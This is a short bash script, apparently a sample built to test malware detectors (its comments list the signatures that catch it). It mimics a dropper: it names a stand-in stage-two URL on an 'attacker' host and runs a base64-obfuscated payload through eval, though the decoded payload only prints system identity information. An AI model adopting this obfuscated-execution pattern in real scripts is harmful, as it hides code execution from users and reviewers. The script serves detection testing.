#!/bin/bash
# Dropper — downloads and executes a second-stage payload
# Detectable by: signature scan (Obfuscated.Payload.Generic), high entropy
STAGE2_URL="${1:-http://attacker:8080/payload}"

echo "[*] Stage 1: Dropper executing..."
# Obfuscated payload execution
PAYLOAD=$(echo 'IyEvYmluL2Jhc2gKZWNobyAiU3RhZ2UgMiBleGVjdXRlZCIKd2hvYW1pCmlkCnVuYW1lIC1h' | base64 -d)
eval "$PAYLOAD" 2>/dev/null || exec "$PAYLOAD" 2>/dev/null
echo "[+] Stage 2 executed"
